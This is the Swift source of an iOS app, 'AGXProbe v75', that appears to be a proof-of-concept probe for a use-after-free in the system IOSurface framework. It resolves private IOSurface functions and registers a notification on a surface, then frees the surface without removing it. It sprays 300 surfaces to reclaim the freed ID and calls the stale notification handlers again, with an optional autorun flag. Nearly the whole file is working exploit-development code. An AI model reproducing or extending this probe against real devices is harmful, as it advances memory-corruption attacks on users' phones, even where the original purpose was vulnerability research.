import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v75 - UAF aggressive spray").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v75")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    private func release(_ ptr: UnsafeMutableRawPointer?) {
        guard let p = ptr else { return }
        Unmanaged<AnyObject>.fromOpaque(p).release()
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v75 - UAF aggressive spray ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }

        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        emit("[*] symbols resolved")

        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[*] port 0x\(String(gPort, radix: 16)) kr=0x\(String(kr, radix: 16))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        func makeSurface(width: Int = 256, height: Int = 256, bpe: Int = 4) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = width
            props["IOSurfaceHeight"] = height
            props["IOSurfaceBytesPerElement"] = bpe
            return gCreate(props)
        }

        // ===== TEST 1: Basic UAF + spray =====
        emit("\n=== TEST 1: Basic UAF + spray ===")
        var sA: UnsafeMutableRawPointer? = makeSurface()
        guard let sAp = sA else { emit("[-] create A failed"); status = "Complete"; isRunning = false; return }
        let idA = gGetID(sAp)
        emit("[A] surface id 0x\(String(idA, radix: 16))")
        let krSetA = gSet(gPort, 1, UInt64(idA))
        emit("[A] set_notify kr=0x\(String(krSetA, radix: 16))")
        release(sA)
        emit("[A] released without remove")

        // Spray with different sizes
        var sprayed: [UnsafeMutableRawPointer?] = []
        var idReuseCount = 0
        var reusedIds: [UInt32] = []
        for i in 0..<300 {
            let w = 256 + (i % 10) * 16  // vary width
            let h = 256 + (i % 10) * 16
            if let s = makeSurface(width: w, height: h) {
                sprayed.append(s)
                let sid = gGetID(s)
                if sid == idA {
                    idReuseCount += 1
                    reusedIds.append(sid)
                    emit("[!] sprayed #\(i) [w=\(w) h=\(h)] has SAME id 0x\(String(sid, radix: 16))")
                }
            }
        }
        emit("[*] sprayed \(sprayed.count) surfaces, idReuseCount=\(idReuseCount)")

        let krRem = gRemove(UInt64(idA))
        emit("[B] remove stale=0x\(String(krRem, radix: 16))")
        let krSetAgain = gSet(gPort, 1, UInt64(idA))
        emit("[C] set again=0x\(String(krSetAgain, radix: 16))")

        // Clean up
        for s in sprayed { release(s) }

        // ===== TEST 2: Rapid UAF cycle with no spray =====
        emit("\n=== TEST 2: Rapid UAF cycles ===")
        for cycle in 0..<10 {
            let cs: UnsafeMutableRawPointer? = makeSurface()
            guard let csp = cs else { emit("[-] cycle \(cycle) create failed"); break }
            let cid = gGetID(csp)
            let kset = gSet(gPort, 1, UInt64(cid))
            emit("[cycle \(cycle)] id=0x\(String(cid, radix: 16)) set=0x\(String(kset, radix: 16))")
            release(csp)
            let krem = gRemove(UInt64(cid))
            emit("[cycle \(cycle)] remove=0x\(String(krem, radix: 16))")
            let kset2 = gSet(gPort, 1, UInt64(cid))
            emit("[cycle \(cycle)] set again=0x\(String(kset2, radix: 16))")
        }

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
